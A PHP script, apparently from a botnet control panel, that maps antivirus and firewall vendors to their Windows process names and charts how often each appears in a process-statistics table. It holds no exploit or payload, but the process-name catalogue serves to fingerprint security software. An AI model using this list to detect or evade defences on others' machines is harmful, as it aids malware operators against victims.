<?php

set_time_limit(600);

ini_set('memory_limit', '1024M');

$list = array();

$av = array();
$av['AVG'] = 'avgam.exe,avgchsvx.exe,avgemc.exe,avgfws9.exe,avgfrw.exe,AVGIDSAgent.exe,AVGIDSMonitor.exe,avgnsx.exe,avgrsx.exe,avgtray.exe,avgwdsvc.exe';
$av['Comodo'] = 'cfp.exe,cmdagent.exe';
$av['Defence Wall'] = ' defensewall.exe,defensewall_serv.exe';
$av['ESET NOD32'] = 'ekrn.exe,egui.exe';
$av['F-secure'] = 'fsav32.exe,fsdfwd.exe,fsgk32.exe,fsgk32st.exe,FSHDLL32.exe,FSM32.exe,FSMA32.exe,fsorsp.exe,fssm32.exe';
$av['KIS'] = 'avp.exe';
$av['Norman Suite'] = 'Zanda.exe,Zlh.exe,nvoy.exe,Nvcoas.exe,nuaa.exe,Nsesvc.exe,Nip.exe,Njeeves.exe,npcsvc32.exe,elogsvc.exe';
$av['Online Armour'] = 'oacat.exe,oahlp.exe,oasrv.exe,oaui.exe';
$av['Outpost'] = 'op_mon.exe,acs.exe';
$av['Sunbelt'] = 'SbPFCl.exe,SbPFLunch.exe,SbPFSvc.exe';
$av['Dr.Web'] = 'dwengine.exe,SpIDerAgent.exe,SpIDergate.exe,SpIDerMl.exe,spidernt.exe,spiderui.exe';
$av['McAfee'] = 'mcagent.exe,mcshield.exe,mcsvhost.exe,mfefire.exe,mfevtps.exe,MOBKbackup.exe,MpfAlert.exe';
$av['Sophos'] = 'CertificationManagerServiceNT.exe,ManagmentAgentNT.exe,MgntSvc.exe,RouterNT.exe,SbeConsole.exe,SophosUpdateMgr.exe';
$av['Avast'] = 'afwServ.exe,AvastSvc.exe,AvastUI.exe';
$av['Avira'] = 'avfwsvc.exe,avguard.exe,avshadow.exe,avwebgrd.exe,avmailc.exe,avgnt.exe';
$av['MSS'] = 'msseces.exe';

function reasult_data($row){	global $list;
	$list[strtoupper($row->name)] = $row->count;
}

foreach($av as $key => $value){	$av_list = explode(',', $value);
	$filter = '(name = \'' . implode('\') OR (name = \'', $av_list) . '\')';
	$result = $mysqli->query_name('SELECT SUM(count) count FROM bf_process_stats WHERE ' . $filter);
	$av[$key] = ceil($result / count($av_list));
}
/*
$count = $mysqli->query_name('SELECT COUNT(id) count FROM bf_process_stats');

$for = ceil($count / 100000);

for($i = 0; $i <= $for; $i++){
	$mysqli->query('SELECT name, count FROM bf_process_stats LIMIT '.($i*100000).', 100000', null, 'reasult_data', false);
}
*/
$result = $mysqli->query('SELECT name, count FROM bf_process_stats', null, 'reasult_data', false);

print('<?xml version="1.0" encoding="UTF-8"?>');
print('<pie>');

$all_count = array_sum($av);
$other_count = '0';

$i=0;
foreach($av as $key => $value){	$i++;
	if(number_format(($value / $all_count) * 100, 2) > '0.5'){		print('<slice title="'.$key.'">'.$value.'</slice>');
	}else{		$other_count += $value;
	}
}
if($other_count > 0) print('<slice title="'.$lang['ostalnie'].'" pull_out="true">'.$other_count.'</slice>');
print('</pie>');

?>